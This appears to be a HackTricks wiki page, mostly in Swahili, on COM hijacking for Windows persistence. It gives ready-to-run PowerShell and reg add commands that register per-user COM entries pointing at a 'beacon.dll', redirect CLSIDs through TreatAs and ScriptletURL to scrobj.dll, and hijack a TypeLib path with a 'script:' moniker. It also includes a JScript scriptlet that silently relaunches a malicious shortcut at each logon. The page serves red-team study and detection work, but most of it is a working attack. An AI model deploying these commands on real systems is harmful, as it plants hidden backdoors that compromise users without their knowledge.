# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta vipengele vya COM visivyopo

Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **persistence mechanism**. Kutumia `procmon` ni rahisi kupata rejista za COM zinazotafutwa ambazo bado hazipo na zinaweza kuundwa na mshambuliaji. Vichujio vya kawaida:

- **RegOpenKey** operations.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inamalizika na **InprocServer32**.

Mabadiliko muhimu wakati wa utafutaji:

- Pia tazama funguo za **`LocalServer32`** zinazokosekana. Baadhi ya madarasa ya COM ni out-of-process servers na zitaleta EXE inayodhibitiwa na mshambuliaji badala ya DLL.
- Tafuta **`TreatAs`** na **`ScriptletURL`** operesheni za rejista pamoja na `InprocServer32`. Yaliyomo ya utambuzi ya hivi karibuni na uandishi wa malware bado yanayomtaja haya kwa sababu ni nadra zaidi kuliko usajili wa COM wa kawaida na kwa hivyo ni high-signal.
- Nakili halali **`ThreadingModel`** kutoka toleo la asili `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wakati unakilisha usajili kwenda HKCU. Kutumia modeli isiyo sahihi mara nyingi huvunja activation na kufanya hijack iwe noisy.
- Kwenye mifumo ya 64-bit angalia mtazamo wa 64-bit na 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` na `HKLM\Software\Classes\WOW6432Node`) kwa sababu programu za 32-bit zinaweza kutatua usajili tofauti wa COM.

Mara ukiamua ni COM gani isiyo ya kweli kuiga, tekeleza amri zifuatazo. _Kuwa mwangalifu endapo utaamua kuiga COM inayopakiwa kila sekunde chache kwani inaweza kuwa kupita kiasi._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks hutumia Custom Triggers kuitisha COM objects, na kwa sababu zinatekelezwa kupitia Task Scheduler, ni rahisi kubashiri lini zitatumika.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ukikagua matokeo unaweza kuchagua ile ambayo itatekelezwa **kila wakati mtumiaji anapoingia**, kwa mfano.

Sasa, ukitafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kwamba thamani haipo katika HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Then, unaweza kuunda tu entry ya HKCU na kila mara mtumiaji anapoingia, backdoor yako itatekelezwa.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` inaruhusu CLSID moja kuigizwa na nyingine. Kwa mtazamo wa mashambulizi hili linamaanisha unaweza kuacha CLSID ya asili bila kuifanyia mabadiliko, kuunda CLSID ya pili kwa kila mtumiaji inayorejea `scrobj.dll`, na kisha kuelekeza COM object halisi kwa ile yenye madhara kwa kutumia `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Hii ni muhimu wakati:

- target application tayari huunda CLSID thabiti wakati wa kuingia au kuanzishwa kwa app
- unataka redirect ya registry tu badala ya kubadilisha `InprocServer32` ya asili
- unataka kutekeleza scriptlet ya `.sct` ya ndani au ya mbali kupitia thamani ya `ScriptletURL`

Mfano wa mtiririko wa kazi (imebadilishwa kutoka Atomic Red Team tradecraft ya umma na utafiti wa zamani wa COM registry abuse):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` husoma thamani ya `ScriptletURL` na kutekeleza `.sct` inayorejelewa, kwa hivyo unaweza kuweka payload kama faili ya ndani au kuipakua kwa mbali kupitia HTTP/HTTPS.
- `TreatAs` ni muhimu hasa wakati usajili wa awali wa COM umekamilika na ni thabiti katika HKLM, kwa sababu unahitaji tu mabadiliko madogo ya mtumiaji badala ya kuiga mti mzima.
- Kwa uhakiki bila kusubiri trigger ya asili, unaweza kuanzisha ProgID/CLSID bandia kwa mikono kwa kutumia `rundll32.exe -sta <ProgID-or-CLSID>` ikiwa darasa la lengo linaunga mkono STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) hufafanua interfaces za COM na hupakiwa kupitia `LoadTypeLib()`. Wakati COM server inapoanzishwa, OS inaweza pia kupakia TypeLib inayohusiana kwa kushauriana na vyeo vya registry chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa na **moniker**, mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib itakapokataliwa – kutoa persistence ya kimyakimya inayochocheka wakati vipengele vya kawaida vinapoguswa.

Hii imeonekana dhidi ya Microsoft Web Browser control (inapakiwa mara nyingi na Internet Explorer, apps zinazoembed WebBrowser, na hata `explorer.exe`).

### Steps (PowerShell)

1) Tambua TypeLib (LIBID) inayotumika na CLSID yenye shughuli nyingi. Mfano wa CLSID unaotumiwa mara kwa mara na malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Elekeza njia ya TypeLib ya mtumiaji kwa scriptlet ya ndani ukitumia moniker ya `script:` (hakuna ruhusa za admin zinazohitajika):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Weka `.sct` ndogo ya JScript ambayo inaanzisha tena payload yako kuu (kwa mfano `.lnk` inayotumiwa na initial chain):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Kuchochea – kufungua IE, programu inayojumuisha WebBrowser control, au hata shughuli za kawaida za Explorer itapakia TypeLib na kutekeleza scriptlet, kuwasha tena mnyororo wako wakati wa logon/reboot.

Usafishaji
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Vidokezo
- Unaweza kutumia mantiki sawa kwa vipengele vingine vya COM vinavyotumika mara kwa mara; daima tambua `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib` kwanza.
- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.

## Marejeo

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
